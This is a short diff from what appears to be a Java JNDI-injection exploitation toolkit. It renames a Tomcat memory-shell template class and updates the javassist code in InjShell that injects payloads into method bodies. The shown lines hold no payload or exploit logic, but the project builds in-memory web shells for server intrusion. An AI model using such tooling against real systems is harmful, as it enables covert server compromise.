@@ -3,7 +3,7 @@ package com.qi4l.jndi.gadgets.utils;
 import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.template.Agent.LinMenshell;
 import com.qi4l.jndi.template.Agent.WinMenshell;
-import com.qi4l.jndi.template.memshell.tomcat.TFJMX;
+import com.qi4l.jndi.template.memshell.tomcat.TSMSFromJMXF;
 import javassist.*;
 import org.apache.commons.codec.binary.Base64;
 
@@ -197,7 +197,7 @@ public class InjShell {
         //添加到类路径，防止出错
         ClassPool pool;
         pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(TFJMX.class));
+        pool.insertClassPath(new ClassClassPath(TSMSFromJMXF.class));
         // 根据传入的不同参数，在不同方法中插入不同的逻辑
         CtMethod cm = ctClass.getDeclaredMethod(method);
         cm.setBody(payload);
